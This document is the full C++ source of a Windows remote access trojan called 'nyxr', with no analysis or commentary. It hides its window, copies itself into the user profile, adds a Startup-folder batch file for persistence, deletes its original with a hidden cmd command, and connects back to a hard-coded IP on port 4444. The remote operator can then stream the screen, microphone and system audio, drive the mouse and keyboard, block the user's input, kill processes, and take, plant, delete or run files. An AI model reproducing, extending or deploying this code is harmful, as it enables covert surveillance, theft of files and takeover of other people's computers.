#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include <endpointvolume.h>
#include <propsys.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <string>
#include <thread>
#include <fstream>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

const int PORT=4444;
enum ChannelType { CH_MAIN=0, CH_AUDIO=1, CH_DEVLIST=2, CH_DIALOG=3, CH_PROCLIST=4, CH_FILE=5 };

static const char* DEFAULT_SERVER_IP = "94.28.233.146";

static std::string GetUserProfileDir(){
    const char* up = getenv("USERPROFILE");
    return up ? std::string(up) : std::string(".");
}
static std::string GetTargetExePath(){
    return GetUserProfileDir() + "\\nyxr.exe";
}
static std::string GetServerIpFilePath(){
    return GetUserProfileDir() + "\\server_ip.txt";
}

const char* GetServerIP(){
    static char ipBuf[64]={0};
    if(ipBuf[0]==0){
        std::string path = GetServerIpFilePath();
        FILE*f=fopen(path.c_str(),"r");
        if(f){
            if(fgets(ipBuf,sizeof(ipBuf),f)){
                int len=(int)strlen(ipBuf);
                while(len>0&&(ipBuf[len-1]=='\n'||ipBuf[len-1]=='\r'||ipBuf[len-1]==' '||ipBuf[len-1]=='\t'))
                    ipBuf[--len]=0;
            }
            fclose(f);
        }
        if(ipBuf[0]==0)
            strncpy(ipBuf, DEFAULT_SERVER_IP, sizeof(ipBuf)-1);
    }
    return ipBuf;
}

void RelocateSelfIfNeeded(){
    char selfPathBuf[MAX_PATH]={0};
    GetModuleFileNameA(NULL, selfPathBuf, MAX_PATH);
    std::string targetPath = GetTargetExePath();

    char fullSelf[MAX_PATH]={0}, fullTarget[MAX_PATH]={0};
    GetFullPathNameA(selfPathBuf, MAX_PATH, fullSelf, NULL);
    GetFullPathNameA(targetPath.c_str(), MAX_PATH, fullTarget, NULL);

    bool alreadyInPlace = (_stricmp(fullSelf, fullTarget) == 0);

    if(!alreadyInPlace){
        CopyFileA(fullSelf, fullTarget, FALSE);
    }

    {
        std::string ipPath = GetServerIpFilePath();
        std::ifstream check(ipPath);
        bool ipExists = check.good();
        check.close();
        if(!ipExists){
            std::ofstream out(ipPath);
            out << DEFAULT_SERVER_IP << "\n";
        }
    }

    {
        std::string batPath = GetUserProfileDir() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
        std::ofstream bat(batPath);
        bat << "@echo off\nstart \"\" \"" << fullTarget << "\"\n";
        bat.close();
    }

    if(!alreadyInPlace){
        {
            std::string launchCmd = "\"" + std::string(fullTarget) + "\"";
            std::vector<char> cmdBuf(launchCmd.begin(), launchCmd.end());
            cmdBuf.push_back('\0');
            STARTUPINFOA si={sizeof(si)}; PROCESS_INFORMATION pi{};
            CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if(pi.hProcess) CloseHandle(pi.hProcess);
            if(pi.hThread) CloseHandle(pi.hThread);
        }

        {
            std::string delCmd = "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + std::string(fullSelf) + "\"";
            std::vector<char> delBuf(delCmd.begin(), delCmd.end());
            delBuf.push_back('\0');
            STARTUPINFOA si2={sizeof(si2)}; si2.dwFlags=STARTF_USESHOWWINDOW; si2.wShowWindow=SW_HIDE;
            PROCESS_INFORMATION pi2{};
            CreateProcessA(NULL, delBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
            if(pi2.hProcess) CloseHandle(pi2.hProcess);
            if(pi2.hThread) CloseHandle(pi2.hThread);
        }

        ExitProcess(0);
    }
}

static const GUID s_SUBTYPE_FLOAT={0x00000003,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
static const GUID s_SUBTYPE_PCM={0x00000001,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
static const PROPERTYKEY s_PKEY_FriendlyName={{0xa45c254e,0xdf1c,0x4efd,{0x80,0x20,0x67,0xd1,0x46,0xa8,0x50,0xe0}},14};

static std::atomic<bool> g_CaptureRunning{false},g_StopCapture{false};
static std::atomic<bool> g_Active{false}, g_Connected{false};
static struct{std::string message;std::string buttons[3];int count;}g_DlgInfo;

void SetVolume(int vol){CoInitialize(0);IMMDeviceEnumerator*pE=0;IMMDevice*pD=0;IAudioEndpointVolume*pV=0;if(SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE))&&SUCCEEDED(pE->GetDefaultAudioEndpoint(eRender,eConsole,&pD))&&SUCCEEDED(pD->Activate(__uuidof(IAudioEndpointVolume),CLSCTX_ALL,0,(void**)&pV)))pV->SetMasterVolumeLevelScalar(vol/100.0f,0);if(pV)pV->Release();if(pD)pD->Release();if(pE)pE->Release();CoUninitialize();}
int GetEncoderClsid(const WCHAR*mime,CLSID*clsid){UINT n=0,s=0;Gdiplus::GetImageEncodersSize(&n,&s);if(!s)return -1;Gdiplus::ImageCodecInfo*p=(Gdiplus::ImageCodecInfo*)malloc(s);Gdiplus::GetImageEncoders(n,s,p);for(UINT i=0;i<n;i++)if(wcscmp(p[i].MimeType,mime)==0){*clsid=p[i].Clsid;free(p);return i;}free(p);return -1;}
bool SendAll(SOCKET s,const char*d,int len){int t=0;while(t<len){int n=send(s,d+t,len-t,0);if(n<=0)return false;t+=n;}return true;}
bool RecvAll(SOCKET s,char*d,int len){int t=0;while(t<len){int n=recv(s,d+t,len-t,0);if(n<=0)return false;t+=n;}return true;}
bool IsFloatFmt(WAVEFORMATEX*pw){if(pw->wFormatTag==WAVE_FORMAT_IEEE_FLOAT)return true;if(pw->wFormatTag==WAVE_FORMAT_EXTENSIBLE)return((WAVEFORMATEXTENSIBLE*)pw)->SubFormat==s_SUBTYPE_FLOAT;return false;}
bool IsPcmFmt(WAVEFORMATEX*pw){if(pw->wFormatTag==WAVE_FORMAT_PCM)return true;if(pw->wFormatTag==WAVE_FORMAT_EXTENSIBLE)return((WAVEFORMATEXTENSIBLE*)pw)->SubFormat==s_SUBTYPE_PCM;return false;}

void SendDialogResponse(const std::string&text){
    SOCKET s=socket(AF_INET,SOCK_STREAM,0);
    sockaddr_in a{};a.sin_family=AF_INET;a.sin_port=htons(PORT);inet_pton(AF_INET,GetServerIP(),&a.sin_addr);
    if(connect(s,(sockaddr*)&a,sizeof(a))==0){
        unsigned char ch=CH_DIALOG;send(s,(char*)&ch,1,0);
        int l=(int)text.size();send(s,(char*)&l,4,0);send(s,text.c_str(),l,0);
    }
    closesocket(s);
}

LRESULT CALLBACK DialogProc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp){switch(msg){case WM_CREATE:{HFONT hF=CreateFontW(16,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,0,L"Segoe UI");SetWindowLongPtr(hwnd,GWLP_USERDATA,(LONG_PTR)hF);int wl=MultiByteToWideChar(CP_ACP,0,g_DlgInfo.message.c_str(),-1,NULL,0);wchar_t*wm=new wchar_t[wl];MultiByteToWideChar(CP_ACP,0,g_DlgInfo.message.c_str(),-1,wm,wl);HWND hM=CreateWindowExW(0,L"STATIC",wm,WS_CHILD|WS_VISIBLE|SS_CENTER|SS_CENTERIMAGE,20,25,360,60,hwnd,0,0,0);SendMessage(hM,WM_SETFONT,(WPARAM)hF,0);delete[]wm;int bW=100,bH=32,tW=g_DlgInfo.count*bW+(g_DlgInfo.count-1)*20,sX=(400-tW)/2;for(int i=0;i<g_DlgInfo.count;i++){wl=MultiByteToWideChar(CP_ACP,0,g_DlgInfo.buttons[i].c_str(),-1,NULL,0);wchar_t*wb=new wchar_t[wl];MultiByteToWideChar(CP_ACP,0,g_DlgInfo.buttons[i].c_str(),-1,wb,wl);HWND hB=CreateWindowExW(0,L"BUTTON",wb,WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,sX+i*(bW+20),110,bW,bH,hwnd,(HMENU)(300+i),0,0);SendMessage(hB,WM_SETFONT,(WPARAM)hF,0);delete[]wb;}return 0;}case WM_COMMAND:{int i=LOWORD(wp)-300;if(i>=0&&i<g_DlgInfo.count){SendDialogResponse(g_DlgInfo.buttons[i]);DestroyWindow(hwnd);}return 0;}case WM_CLOSE:SendDialogResponse("(closed)");DestroyWindow(hwnd);return 0;case WM_DESTROY:{HFONT hF=(HFONT)GetWindowLongPtr(hwnd,GWLP_USERDATA);if(hF)DeleteObject(hF);PostQuitMessage(0);return 0;}}return DefWindowProc(hwnd,msg,wp,lp);}
void ShowDialogThread(){static bool reg=false;if(!reg){WNDCLASSEXA wc={sizeof(wc)};wc.lpfnWndProc=DialogProc;wc.hInstance=GetModuleHandle(0);wc.hCursor=LoadCursor(0,IDC_ARROW);wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);wc.lpszClassName="NyxDialog";RegisterClassExA(&wc);reg=true;}int sw=GetSystemMetrics(SM_CXSCREEN),sh=GetSystemMetrics(SM_CYSCREEN);HWND d=CreateWindowExA(WS_EX_TOPMOST,"NyxDialog","Message",WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU,(sw-400)/2,(sh-180)/2,400,180,NULL,NULL,GetModuleHandle(0),NULL);ShowWindow(d,SW_SHOW);UpdateWindow(d);MSG m;while(GetMessage(&m,0,0,0)){TranslateMessage(&m);DispatchMessage(&m);}}

void SendProcessList(){
    SOCKET s=socket(AF_INET,SOCK_STREAM,0);
    sockaddr_in a{};a.sin_family=AF_INET;a.sin_port=htons(PORT);inet_pton(AF_INET,GetServerIP(),&a.sin_addr);
    if(connect(s,(sockaddr*)&a,sizeof(a))!=0){closesocket(s);return;}
    unsigned char ch=CH_PROCLIST;send(s,(char*)&ch,1,0);
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);if(snap==INVALID_HANDLE_VALUE){closesocket(s);return;}
    PROCESSENTRY32 pe;pe.dwSize=sizeof(pe);std::vector<std::pair<DWORD,std::string>>procs;
    if(Process32First(snap,&pe)){do{if(_stricmp(pe.szExeFile,"svchost.exe")==0)continue;procs.push_back({pe.th32ProcessID,std::string(pe.szExeFile)});}while(Process32Next(snap,&pe));}
    CloseHandle(snap);
    int c=(int)procs.size();SendAll(s,(char*)&c,4);
    for(auto&p:procs){SendAll(s,(char*)&p.first,4);int nl=(int)p.second.size();SendAll(s,(char*)&nl,4);if(nl>0)SendAll(s,p.second.c_str(),nl);}
    closesocket(s);
}
void KillProcess(DWORD pid){HANDLE h=OpenProcess(PROCESS_TERMINATE,FALSE,pid);if(h){TerminateProcess(h,1);CloseHandle(h);}}

void CaptureAndStream(bool systemAudio,int micDevIdx){
    g_CaptureRunning=true;
    SOCKET sock=INVALID_SOCKET;
    for(int i=0;i<15;i++){
        if(g_StopCapture)break;
        sock=socket(AF_INET,SOCK_STREAM,0);if(sock==INVALID_SOCKET)break;
        sockaddr_in a{};a.sin_family=AF_INET;a.sin_port=htons(PORT);inet_pton(AF_INET,GetServerIP(),&a.sin_addr);
        if(connect(sock,(sockaddr*)&a,sizeof(a))==0)break;
        closesocket(sock);sock=INVALID_SOCKET;Sleep(400);
    }
    if(sock==INVALID_SOCKET){g_CaptureRunning=false;return;}
    {
        unsigned char ch=CH_AUDIO;
        if(!SendAll(sock,(char*)&ch,1)){closesocket(sock);g_CaptureRunning=false;return;}
    }
    CoInitialize(0);IMMDeviceEnumerator*pE=NULL;IMMDevice*pD=NULL;IAudioClient*pAC=NULL;IAudioCaptureClient*pCC=NULL;WAVEFORMATEX*pwfx=NULL;HRESULT hr=CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE);if(SUCCEEDED(hr)){if(systemAudio){hr=pE->GetDefaultAudioEndpoint(eRender,eConsole,&pD);}else{IMMDeviceCollection*pC=NULL;hr=pE->EnumAudioEndpoints(eCapture,DEVICE_STATE_ACTIVE,&pC);if(SUCCEEDED(hr)){UINT cnt;pC->GetCount(&cnt);hr=(micDevIdx>=0&&micDevIdx<(int)cnt)?pC->Item(micDevIdx,&pD):(cnt>0)?pC->Item(0,&pD):E_FAIL;pC->Release();}}}if(SUCCEEDED(hr)&&pD)hr=pD->Activate(__uuidof(IAudioClient),CLSCTX_ALL,0,(void**)&pAC);if(SUCCEEDED(hr))hr=pAC->GetMixFormat(&pwfx);DWORD flags=systemAudio?AUDCLNT_STREAMFLAGS_LOOPBACK:0;if(SUCCEEDED(hr))hr=pAC->Initialize(AUDCLNT_SHAREMODE_SHARED,flags,20000000,0,pwfx,NULL);if(SUCCEEDED(hr))hr=pAC->GetService(__uuidof(IAudioCaptureClient),(void**)&pCC);if(SUCCEEDED(hr)&&pwfx){int sr=pwfx->nSamplesPerSec;short ch2=pwfx->nChannels;bool isF=IsFloatFmt(pwfx),isP=IsPcmFmt(pwfx);int bps=pwfx->wBitsPerSample;if(!SendAll(sock,(char*)&sr,4)||!SendAll(sock,(char*)&ch2,2))goto cleanup;hr=pAC->Start();if(SUCCEEDED(hr)){bool conn=true;float gain=systemAudio?0.85f:1.0f;while(!g_StopCapture&&conn){while(!g_StopCapture){UINT32 pkt;hr=pCC->GetNextPacketSize(&pkt);if(FAILED(hr)||pkt==0)break;BYTE*pData;UINT32 nF;DWORD bf;hr=pCC->GetBuffer(&pData,&nF,&bf,NULL,NULL);if(FAILED(hr))break;int total=nF*ch2,pcmLen=total*2;std::vector<short>pcm(total);if(bf&AUDCLNT_BUFFERFLAGS_SILENT){memset(pcm.data(),0,pcmLen);}else if(isF){float*f=(float*)pData;for(int i=0;i<total;i++){float v=f[i];if(v>1.f)v=1.f;if(v<-1.f)v=-1.f;pcm[i]=(short)(v*32767.f*gain);}}else if(isP&&bps==16){memcpy(pcm.data(),pData,pcmLen);for(int i=0;i<total;i++)pcm[i]=(short)(pcm[i]*gain);}else if(isP&&bps==32){int32_t*s32=(int32_t*)pData;for(int i=0;i<total;i++)pcm[i]=(short)((s32[i]>>16)*gain);}else if(isP&&bps==24){BYTE*p24=(BYTE*)pData;for(int i=0;i<total;i++){int32_t v=(int32_t)((uint32_t)p24[i*3]|((uint32_t)p24[i*3+1])<<8|((uint32_t)p24[i*3+2])<<16);if(v&0x800000)v|=0xFF000000;pcm[i]=(short)((v>>8)*gain);}}else if(isP&&bps==8){BYTE*p8=(BYTE*)pData;for(int i=0;i<total;i++)pcm[i]=(short)(((int)p8[i]-128)*256*gain);}else{float*f=(float*)pData;for(int i=0;i<total;i++){float v=f[i];if(v>1.f)v=1.f;if(v<-1.f)v=-1.f;pcm[i]=(short)(v*32767.f*gain);}}pCC->ReleaseBuffer(nF);if(systemAudio){int64_t sum=0;for(int i=0;i<total;i++)sum+=(int64_t)pcm[i]*pcm[i];if(sum/total<90000)memset(pcm.data(),0,pcmLen);}if(!SendAll(sock,(char*)&pcmLen,4)||!SendAll(sock,(char*)pcm.data(),pcmLen))conn=false;}if(conn)Sleep(5);}pAC->Stop();}}cleanup:if(pwfx)CoTaskMemFree(pwfx);if(pCC)pCC->Release();if(pAC)pAC->Release();if(pD)pD->Release();if(pE)pE->Release();CoUninitialize();closesocket(sock);g_CaptureRunning=false;
}

void SendDeviceList(){
    SOCKET s=socket(AF_INET,SOCK_STREAM,0);
    sockaddr_in a{};a.sin_family=AF_INET;a.sin_port=htons(PORT);inet_pton(AF_INET,GetServerIP(),&a.sin_addr);
    if(connect(s,(sockaddr*)&a,sizeof(a))!=0){closesocket(s);return;}
    unsigned char ch=CH_DEVLIST;send(s,(char*)&ch,1,0);
    CoInitialize(0);IMMDeviceEnumerator*pE=NULL;CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,__uuidof(IMMDeviceEnumerator),(void**)&pE);IMMDeviceCollection*pC=NULL;pE->EnumAudioEndpoints(eCapture,DEVICE_STATE_ACTIVE,&pC);UINT cnt=0;pC->GetCount(&cnt);int n=(int)cnt;SendAll(s,(char*)&n,4);for(int i=0;i<n;i++){IMMDevice*pD=NULL;pC->Item(i,&pD);IPropertyStore*pS=NULL;pD->OpenPropertyStore(STGM_READ,&pS);PROPVARIANT nm;ZeroMemory(&nm,sizeof(nm));pS->GetValue(s_PKEY_FriendlyName,&nm);char buf[256]={};if(nm.vt==VT_LPWSTR&&nm.pwszVal)WideCharToMultiByte(CP_ACP,0,nm.pwszVal,-1,buf,255,"?",NULL);int len=(int)strlen(buf);SendAll(s,(char*)&len,4);SendAll(s,buf,len);if(nm.vt==VT_LPWSTR&&nm.pwszVal)CoTaskMemFree(nm.pwszVal);pS->Release();pD->Release();}pC->Release();pE->Release();CoUninitialize();closesocket(s);
}

// --- NEW FILE MANAGER FUNCTIONS ---
void SendFileListResponse(SOCKET s, const std::string& path) {
    std::vector<std::pair<std::string, bool>> items;
    std::vector<int64_t> sizes;
    std::string search = path;
    if (!search.empty() && search.back() != '\\') search += "\\";
    search += "*";
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search.c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
            bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
            items.push_back({fd.cFileName, isDir});
            int64_t sz = isDir ? 0 : ((int64_t)fd.nFileSizeHigh << 32 | fd.nFileSizeLow);
            sizes.push_back(sz);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    int type = 0; SendAll(s, (char*)&type, 4);
    int c = (int)items.size(); SendAll(s, (char*)&c, 4);
    for (int i = 0; i < c; i++) {
        int isDir = items[i].second ? 1 : 0; SendAll(s, (char*)&isDir, 4);
        int nl = (int)items[i].first.size(); SendAll(s, (char*)&nl, 4);
        if (nl > 0) SendAll(s, items[i].first.c_str(), nl);
        SendAll(s, (char*)&sizes[i], 8);
    }
}

void SendFileDownloadResponse(SOCKET s, const std::string& path) {
    int type = 1; SendAll(s, (char*)&type, 4);
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        int64_t sz = -1; SendAll(s, (char*)&sz, 8); return;
    }
    LARGE_INTEGER li; GetFileSizeEx(hFile, &li);
    int64_t sz = li.QuadPart; SendAll(s, (char*)&sz, 8);
    char buf[65536]; DWORD read;
    while (sz > 0) {
        int toRead = (sz > sizeof(buf)) ? sizeof(buf) : (int)sz;
        ReadFile(hFile, buf, toRead, &read, NULL);
        if (read == 0) break;
        SendAll(s, buf, read);
        sz -= read;
    }
    CloseHandle(hFile);
}

void ReceiveFileUpload(SOCKET s, const std::string& path, int64_t size) {
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    char buf[65536];
    while (size > 0) {
        int toRead = (size > sizeof(buf)) ? sizeof(buf) : (int)size;
        if (!RecvAll(s, buf, toRead)) break;
        DWORD written; WriteFile(hFile, buf, toRead, &written, NULL);
        size -= toRead;
    }
    CloseHandle(hFile);
}

void CommandListener(SOCKET s){
    while(g_Connected){
        char cmd;if(recv(s,&cmd,1,0)!=1)break;
        if(cmd=='V'){int vol;if(!RecvAll(s,(char*)&vol,4))break;SetVolume(vol);}
        else if(cmd=='P'){int sz;if(!RecvAll(s,(char*)&sz,4))break;std::vector<char>buf(sz);if(!RecvAll(s,buf.data(),sz))break;char tmp[MAX_PATH];GetTempPathA(MAX_PATH,tmp);std::string f=std::string(tmp)+"nyx_remote.mp3";mciSendStringA("close nyx",0,0,0);std::ofstream out(f,std::ios::binary);out.write(buf.data(),sz);out.close();mciSendStringA(("open \""+f+"\" type mpegvideo alias nyx").c_str(),0,0,0);mciSendStringA("play nyx",0,0,0);}
        else if(cmd=='S'){mciSendStringA("close nyx",0,0,0);}
        else if(cmd=='A'){char on;if(recv(s,&on,1,0)!=1)break;if(on){g_StopCapture=true;while(g_CaptureRunning)Sleep(10);g_StopCapture=false;std::thread(CaptureAndStream,true,0).detach();}else{g_StopCapture=true;}}
        else if(cmd=='M'){char on;if(recv(s,&on,1,0)!=1)break;int di=0;if(on&&!RecvAll(s,(char*)&di,4))break;if(on){g_StopCapture=true;while(g_CaptureRunning)Sleep(10);g_StopCapture=false;std::thread(CaptureAndStream,false,di).detach();}else{g_StopCapture=true;}}
        else if(cmd=='L'){std::thread([](){SendDeviceList();}).detach();}
        else if(cmd=='R'){std::thread([](){SendProcessList();}).detach();}
        else if(cmd=='K'){DWORD pid;if(!RecvAll(s,(char*)&pid,4))break;KillProcess(pid);}
        else if(cmd=='F'){char on;if(recv(s,&on,1,0)!=1)break;BlockInput(on?TRUE:FALSE);}
        else if(cmd=='1'){g_Active=true;}
        else if(cmd=='0'){g_Active=false;BlockInput(FALSE);}
        else if(cmd=='m'){int x,y;if(!RecvAll(s,(char*)&x,4)||!RecvAll(s,(char*)&y,4))break;int sx=x*GetSystemMetrics(SM_CXSCREEN)/10000;int sy=y*GetSystemMetrics(SM_CYSCREEN)/10000;SetCursorPos(sx,sy);}
        else if(cmd=='c'){char btn,act;if(recv(s,&btn,1,0)!=1||recv(s,&act,1,0)!=1)break;DWORD fl=0;if(btn==0)fl=(act==0)?MOUSEEVENTF_LEFTDOWN:MOUSEEVENTF_LEFTUP;else if(btn==1)fl=(act==0)?MOUSEEVENTF_RIGHTDOWN:MOUSEEVENTF_RIGHTUP;else if(btn==2)fl=(act==0)?MOUSEEVENTF_MIDDLEDOWN:MOUSEEVENTF_MIDDLEUP;INPUT inp={};inp.type=INPUT_MOUSE;inp.mi.dwFlags=fl;SendInput(1,&inp,sizeof(INPUT));}
        else if(cmd=='k'){DWORD vk;char act;if(!RecvAll(s,(char*)&vk,4)||recv(s,&act,1,0)!=1)break;INPUT inp={};inp.type=INPUT_KEYBOARD;inp.ki.wVk=(WORD)vk;inp.ki.dwFlags=(act==1)?KEYEVENTF_KEYUP:0;SendInput(1,&inp,sizeof(INPUT));}
        else if(cmd=='w'){int delta;if(!RecvAll(s,(char*)&delta,4))break;INPUT inp={};inp.type=INPUT_MOUSE;inp.mi.dwFlags=MOUSEEVENTF_WHEEL;inp.mi.mouseData=(DWORD)delta;SendInput(1,&inp,sizeof(INPUT));}
        else if(cmd=='D'){int ml;if(!RecvAll(s,(char*)&ml,4))break;std::string msg;if(ml>0){std::vector<char>mb(ml);if(!RecvAll(s,mb.data(),ml))break;mb.push_back(0);msg=std::string(mb.data());}int nb;if(!RecvAll(s,(char*)&nb,4))break;g_DlgInfo.message=msg;g_DlgInfo.count=0;for(int i=0;i<nb&&i<3;i++){int bl;if(!RecvAll(s,(char*)&bl,4))break;std::string btn;if(bl>0){std::vector<char>bb(bl);if(!RecvAll(s,bb.data(),bl))break;bb.push_back(0);btn=std::string(bb.data());}g_DlgInfo.buttons[g_DlgInfo.count++]=btn;}std::thread([](){ShowDialogThread();}).detach();}
        
        // --- NEW FILE MANAGER COMMANDS ---
        else if(cmd=='I'){
            char sub; if(recv(s,&sub,1,0)!=1)break;
            if(sub=='L'){
                int pl; if(!RecvAll(s,(char*)&pl,4))break;
                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
                SendFileListResponse(s, path);
            } else if(sub=='D'){
                int pl; if(!RecvAll(s,(char*)&pl,4))break;
                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
                DeleteFileA(path.c_str());
            } else if(sub=='O'){
                int pl; if(!RecvAll(s,(char*)&pl,4))break;
                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
                ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
            } else if(sub=='U'){
                int pl; if(!RecvAll(s,(char*)&pl,4))break;
                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
                int64_t fsize; if(!RecvAll(s,(char*)&fsize,8))break;
                ReceiveFileUpload(s, path, fsize);
            } else if(sub=='W'){
                int pl; if(!RecvAll(s,(char*)&pl,4))break;
                std::string path; if(pl>0){std::vector<char>b(pl);RecvAll(s,b.data(),pl);path=std::string(b.data(),pl);}
                SendFileDownloadResponse(s, path);
            }
        }
    }
    BlockInput(FALSE);
    g_Connected = false;
}

int main(){
    SetProcessDPIAware();
    RelocateSelfIfNeeded();

    WSADATA wsa;if(WSAStartup(MAKEWORD(2,2),&wsa)!=0)return 1;
    Gdiplus::GdiplusStartupInput gdip;ULONG_PTR gt;Gdiplus::GdiplusStartup(&gt,&gdip,0);
    CLSID jc;GetEncoderClsid(L"image/jpeg",&jc);
    Gdiplus::EncoderParameters eps;eps.Count=1;eps.Parameter[0].Guid=Gdiplus::EncoderQuality;eps.Parameter[0].Type=Gdiplus::EncoderParameterValueTypeLong;eps.Parameter[0].NumberOfValues=1;ULONG q=78;eps.Parameter[0].Value=&q;
    while(true){
        SOCKET sock=socket(AF_INET,SOCK_STREAM,0);if(sock==INVALID_SOCKET){Sleep(5000);continue;}
        sockaddr_in addr{};addr.sin_family=AF_INET;addr.sin_port=htons(PORT);inet_pton(AF_INET,GetServerIP(),&addr.sin_addr);
        if(connect(sock,(sockaddr*)&addr,sizeof(addr))==0){
            unsigned char ch=CH_MAIN;send(sock,(char*)&ch,1,0);
            char hostbuf[256]={0};
            gethostname(hostbuf, sizeof(hostbuf));
            int hlen = strlen(hostbuf);
            if(hlen == 0){ strcpy(hostbuf, "UnknownPC"); hlen = 9; }
            send(sock, (char*)&hlen, 4, 0);
            send(sock, hostbuf, hlen, 0);
            
            g_Active = false;
            g_Connected = true;
            std::thread(CommandListener,sock).detach();
            while(g_Connected){
                if(g_Active){
                    HDC hS=GetDC(NULL);int w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);HDC mem=CreateCompatibleDC(hS);HBITMAP bmp=CreateCompatibleBitmap(hS,w,h);HBITMAP oldB=(HBITMAP)SelectObject(mem,bmp);BitBlt(mem,0,0,w,h,hS,0,0,SRCCOPY);SelectObject(mem,oldB);DeleteDC(mem);ReleaseDC(NULL,hS);
                    IStream*strm=0;CreateStreamOnHGlobal(0,TRUE,&strm);
                    {Gdiplus::Bitmap gb(bmp,NULL);gb.Save(strm,&jc,&eps);}
                    DeleteObject(bmp);
                    STATSTG st;strm->Stat(&st,STATFLAG_NONAME);ULONG len=st.cbSize.LowPart;BYTE*data=new BYTE[len];LARGE_INTEGER li{};strm->Seek(li,STREAM_SEEK_SET,0);ULONG rd;strm->Read(data,len,&rd);strm->Release();
                    bool ok=SendAll(sock,(char*)&len,4)&&SendAll(sock,(char*)data,len);
                    delete[]data;if(!ok){g_Connected=false;break;}
                    Sleep(33); // Optimized from 150ms to ~30 FPS
                } else {
                    Sleep(100);
                }
            }
        }
        g_Active = false;
        closesocket(sock);Sleep(5000);
    }
    Gdiplus::GdiplusShutdown(gt);WSACleanup();return 0;
}